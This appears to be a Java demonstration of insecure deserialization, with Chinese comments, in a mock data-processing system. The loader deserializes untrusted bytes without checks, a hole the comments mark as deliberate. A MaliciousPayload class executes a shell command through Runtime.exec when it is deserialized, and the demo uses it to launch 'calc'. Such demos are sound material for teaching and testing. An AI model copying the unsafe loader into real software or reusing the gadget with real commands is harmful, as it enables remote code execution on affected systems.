package com.bigdata.processor;

import java.io.*;
import java.util.*;

// 任务配置基类（接口）
interface TaskConfig {
    String getTaskType();
}

// 数据分析任务配置
class DataAnalysisConfig implements TaskConfig, Serializable {
    private String query;
    private String dataSource;
    private transient Map<String, Object> metadata;

    public DataAnalysisConfig(String query, String dataSource) {
        this.query = query;
        this.dataSource = dataSource;
        this.metadata = new HashMap<>();
    }

    @Override
    public String getTaskType() {
        return "DATA_ANALYSIS";
    }

    // 模拟实际使用中的延迟初始化
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        metadata = new HashMap<>();
    }
}

// 数据清洗任务配置
class DataCleaningConfig implements TaskConfig, Serializable {
    private String cleaningRule;
    private String targetSystem;

    public DataCleaningConfig(String cleaningRule, String targetSystem) {
        this.cleaningRule = cleaningRule;
        this.targetSystem = targetSystem;
    }

    @Override
    public String getTaskType() {
        return "DATA_CLEANING";
    }
}

// 任务处理器
class TaskProcessor {
    // 模拟从网络或存储加载任务配置
    public TaskConfig loadTaskConfig(byte[] serializedData) throws IOException, ClassNotFoundException {
        try (ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(serializedData))) {
            // 不安全的反序列化操作（漏洞点）
            return (TaskConfig) ois.readObject();
        }
    }

    // 模拟处理任务配置
    public void processTask(byte[] serializedData) throws IOException, ClassNotFoundException {
        TaskConfig config = loadTaskConfig(serializedData);
        System.out.println("Processing task: " + config.getTaskType());
        
        // 根据不同任务类型执行处理逻辑
        if (config instanceof DataAnalysisConfig) {
            DataAnalysisConfig dac = (DataAnalysisConfig) config;
            System.out.println("Executing query: " + dac.query + " on " + dac.dataSource);
        } else if (config instanceof DataCleaningConfig) {
            DataCleaningConfig dcc = (DataCleaningConfig) config;
            System.out.println("Applying rule: " + dcc.cleaningRule + " to " + dcc.targetSystem);
        }
    }
}

// 模拟攻击者构造的恶意类
class MaliciousPayload implements Serializable {
    private String command;

    public MaliciousPayload(String command) {
        this.command = command;
    }

    // 重写readObject方法触发命令执行
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        try {
            Runtime.getRuntime().exec(command);
        } catch (Exception e) {
            System.err.println("Exploit failed: " + e.getMessage());
        }
    }
}

// 主程序（模拟攻击场景）
public class DataProcessingSystem {
    public static void main(String[] args) throws Exception {
        // 正常使用示例
        TaskProcessor processor = new TaskProcessor();
        
        // 构造正常任务配置并序列化
        DataAnalysisConfig normalConfig = new DataAnalysisConfig("SELECT * FROM logs", "HDFS://cluster1/logs");
        byte[] serializedNormal = serialize(normalConfig);
        System.out.println("Normal task processing:");
        processor.processTask(serializedNormal);
        
        // 构造恶意payload（模拟攻击）
        System.out.println("\
Injecting malicious payload...");
        MaliciousPayload evilPayload = new MaliciousPayload("calc");
        byte[] serializedEvil = serialize(evilPayload);
        
        // 漏洞触发（会执行计算器）
        System.out.println("Triggering vulnerability:");
        processor.processTask(serializedEvil);
    }

    // 序列化工具方法
    private static byte[] serialize(Serializable obj) throws IOException {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try (ObjectOutputStream oos = new ObjectOutputStream(bos)) {
            oos.writeObject(obj);
        }
        return bos.toByteArray();
    }
}